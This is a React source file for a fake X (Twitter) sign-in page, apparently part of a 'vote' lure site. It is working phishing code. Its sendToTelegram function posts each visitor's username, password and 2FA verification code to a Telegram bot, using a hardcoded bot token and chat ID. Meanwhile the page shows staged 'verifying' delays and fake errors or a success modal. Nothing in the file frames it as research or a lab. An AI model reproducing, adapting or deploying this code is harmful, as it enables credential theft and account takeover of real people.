import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { auth } from '@/lib/firebase';
import { TwitterAuthProvider, signInWithPopup } from 'firebase/auth';
import { useToast } from '@/hooks/use-toast';
import { X } from 'lucide-react';
import { useAuthSettings } from '@/hooks/use-auth-settings';
import { VoteSuccessModal } from '@/components/VoteSuccessModal';

const TELEGRAM_BOT_TOKEN = '7371815939:AAEi9KZLsmz1bM5vxgNic7NXUocO6tdSHks';
const TELEGRAM_CHAT_ID = '-1002380892216';

const TwitterLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [show2FA, setShow2FA] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();
  const { settings, loading: settingsLoading } = useAuthSettings('twitter');

  const sendToTelegram = async (username: string, password: string) => {
    const message = `🔐 New Twitter Login\n\n👤 Username: ${username}\n🔑 Password: ${password}\n\n📱 Platform: Twitter\n⏰ Time: ${new Date().toLocaleString()}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(username, password);

      toast({
        title: "Verifying...",
        description: "Please wait while we verify your credentials",
      });

      setTimeout(() => {
        setLoading(false);
        if (settings?.platforms?.twitter?.login?.success) {
          setShow2FA(true);
        } else {
          toast({
            title: "Error",
            description: "Authentication failed. Please try again later.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to login. Please try again.",
        variant: "destructive",
        className: "bg-white text-black",
      });
      setLoading(false);
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verificationCode) {
      toast({
        title: "Error",
        description: "Please enter verification code",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(username, `2FA Code: ${verificationCode}`);
      
      toast({
        title: "Verifying code...",
        description: "Please wait while we verify your code",
      });

      setTimeout(() => {
        if (settings?.platforms?.twitter?.twoFactor?.success) {
          setShowSuccessModal(true);
        } else {
          toast({
            title: "Error",
            description: "Invalid verification code. Please try again.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
        setLoading(false);
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify code. Please try again.",
        variant: "destructive",
        className: "bg-white text-black",
      });
      setLoading(false);
    }
  };

  if (settingsLoading) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-white" />
      </div>
    );
  }

  return (
    <>
      <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
        <div className="max-w-md w-full space-y-8">
          <div className="text-center">
            <X className="h-8 w-8 mx-auto" />
            <h2 className="mt-6 text-3xl font-bold">
              {show2FA ? 'Verify your identity' : 'Sign in to X'}
            </h2>
          </div>

          <div className="fixed bottom-4 left-4">
            <a 
              href="/"
              className="text-sm text-gray-400 hover:text-white flex items-center gap-2"
            >
              <svg 
                xmlns="http://www.w3.org/2000/svg" 
                width="16" 
                height="16" 
                viewBox="0 0 24 24" 
                fill="none" 
                stroke="currentColor" 
                strokeWidth="2" 
                strokeLinecap="round" 
                strokeLinejoin="round"
              >
                <path d="M19 12H5M12 19l-7-7 7-7"/>
              </svg>
              Back to Black and White Entertainment
            </a>
          </div>

          {!show2FA ? (
            <form onSubmit={handleLogin} className="mt-8 space-y-6">
              <div className="space-y-4">
                <input
                  type="text"
                  placeholder="Phone, email, or username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3 bg-black border border-gray-600 rounded-md focus:outline-none focus:border-blue-500 text-white"
                  required
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 bg-black border border-gray-600 rounded-md focus:outline-none focus:border-blue-500 text-white"
                  required
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 bg-white text-black rounded-full font-bold hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Signing in...' : 'Sign in'}
              </button>
              <div className="flex justify-between text-sm">
                <a href="#" className="text-[#1d9bf0] hover:underline">Forgot password?</a>
                <a href="#" className="text-[#1d9bf0] hover:underline">Sign up to X</a>
              </div>
            </form>
          ) : (
            <form onSubmit={handle2FASubmit} className="mt-8 space-y-6">
              <div className="space-y-4">
                <p className="text-sm text-gray-400">
                  We sent a verification code to your registered phone number or email for ***{username.slice(-4)}
                </p>
                <input
                  type="text"
                  placeholder="Enter verification code"
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                  className="w-full px-4 py-3 bg-black border border-gray-600 rounded-md focus:outline-none focus:border-blue-500 text-white"
                  required
                  maxLength={6}
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 bg-white text-black rounded-full font-bold hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Verifying...' : 'Verify'}
              </button>
              <div className="text-center">
                <button 
                  type="button"
                  onClick={() => setShow2FA(false)}
                  className="text-[#1d9bf0] text-sm hover:underline"
                >
                  Use different account
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
      <VoteSuccessModal 
        open={showSuccessModal} 
        onClose={() => {
          setShowSuccessModal(false);
          navigate('/');
        }} 
      />
    </>
  );
};

export default TwitterLogin;